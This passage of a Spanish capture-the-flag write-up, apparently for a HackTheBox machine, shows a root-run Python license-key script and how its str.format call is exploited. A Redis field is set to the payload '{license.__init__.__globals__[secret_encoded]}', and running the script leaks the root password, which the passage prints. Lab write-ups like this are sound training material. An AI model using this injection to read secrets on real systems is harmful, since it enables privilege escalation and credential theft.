+<span class="kn">from</span> <span class="nn">cryptography.hazmat.backends</span> <span class="kn">import</span> <span class="n">default_backend</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">hashes</span>
+<span class="kn">from</span> <span class="nn">cryptography.hazmat.primitives.kdf.pbkdf2</span> <span class="kn">import</span> <span class="n">PBKDF2HMAC</span>
+<span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span>
+<span class="kn">import</span> <span class="nn">redis</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="n">today</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Microblog license key manager can only be run as root"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Microblog license key manager'</span><span class="p">)</span>
+<span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--provision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Provision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--deprovision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Deprovision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--check'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Check if specified license key is valid'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'license_key'</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="s">'/var/run/redis/redis.sock'</span><span class="p">)</span>
+
+<span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/secret"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'microblogsalt123'</span>
+<span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+<span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="p">.</span><span class="n">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
+<span class="n">l</span> <span class="o">=</span> <span class="n">License</span><span class="p">()</span>
+
+<span class="c1">#provision
+</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
+    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hgetall</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"User does not exist. Please provide valid username."</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">user_key</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"License key has already been provisioned for this user"</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+    <span class="n">prefix</span> <span class="o">=</span> <span class="s">"microblog"</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"username"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"first-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"last-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"{license.license}"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nb">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Plaintext license key:"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Encrypted license key (distribute to customer):"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
+        <span class="n">license_keys_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="c1">#deprovision
+</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">deprovision</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"License key deprovisioning coming soon"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+
+<span class="c1">#check
+</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"License key valid! Decrypted value:"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"License key invalid"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Podemos ver que recibe 3 argumentos:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--provision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Provision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--deprovision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Deprovision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
+<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--check'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Check if specified license key is valid'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'license_key'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Y la parte interesante es esta al momento de generar la licencia para el usuario:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"{license.license}"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nb">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>prefix, username y firstlast son unas partes de la licencia que se generara</li>
+  <li>Con {license.license} y license=1, se le esta diciendo que acceda a un atributo en especifico del objeto el cual es una instancia de la clase Licence, donde el atributo es la licencia, como se puede ver aca</li>
+</ul>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="n">today</span><span class="p">()</span>
+</code></pre></div></div>
+
+<ul>
+  <li>El <code class="language-plaintext highlighter-rouge">format()</code> se esta utilizando para reemplazar el valor de la posición 1 en la cadena de <code class="language-plaintext highlighter-rouge">license</code>, con los valores que corresponde, es decir, el marcador de posición de <code class="language-plaintext highlighter-rouge">{license.license}</code> se reemplaza por el valor del atributo <code class="language-plaintext highlighter-rouge">license</code> de la clase <code class="language-plaintext highlighter-rouge">License</code>, el cual viene como argumento por CLI, el problema es que mediante <code class="language-plaintext highlighter-rouge">format()</code> podemos acceder directamente a las propiedades de un objeto para obtener su valor, como por ejemplo, podemos acceder a los de la clase <code class="language-plaintext highlighter-rouge">License</code>, sin embargo, el problema grave viene por que tambien podemos acceder directamenta a otros atributos fuera de la clase para recuperar el valor de cualquier otra variable o atributo que este en el programa, eso lo podemos hacer con <code class="language-plaintext highlighter-rouge">__init__</code> y <code class="language-plaintext highlighter-rouge">__globals__</code>, ahora, guiandome de <a href="https://podalirius.net/en/articles/python-format-string-vulnerabilities/">aca</a> explotaremos esta vulnerabilidad, usaremos redis otra vez: <code class="language-plaintext highlighter-rouge">redis-cli -s /var/run/redis/redis.sock</code></li>
+</ul>
+
+<p>Ahora dentro de redis, usaremos <code class="language-plaintext highlighter-rouge">HMSET</code> para establecer varios valores en una clave:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HMSET c4rta first-name "{license.__init__.__globals__[secret_encoded]}" last-name hola username c4rta
+</code></pre></div></div>
+
+<p>En este caso, estamos estableciendo first-name, last-name y username en la clave “c4rta” dentro de una estructura hash, y el valor que le asignamos a first-name es <code class="language-plaintext highlighter-rouge">{license.init.globals[secret_encoded]}</code> donde estamos llamando a <code class="language-plaintext highlighter-rouge">secret_encoded</code> el cual es una variable en el archivo que analizamos y el cual contiene la licencia, que vendria siendo la contraseña, como se ve aca:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/secret"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Asi que ahora si llamamos al archivo con la licencia <code class="language-plaintext highlighter-rouge">c4rta</code> nos debe de mostrar la contraseña de root <code class="language-plaintext highlighter-rouge">sudo /usr/bin/license -p c4rta</code></p>
+
+<p><img src="/assets/img/htb-format/20.png" alt="" /></p>
+
+<p>Y ya esta: la contraseña de root es <code class="language-plaintext highlighter-rouge">unCR4ckaBL3Pa$$w0rd</code></p>
+
+<p><img src="/assets/img/htb-format/21.png" alt="" /></p>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
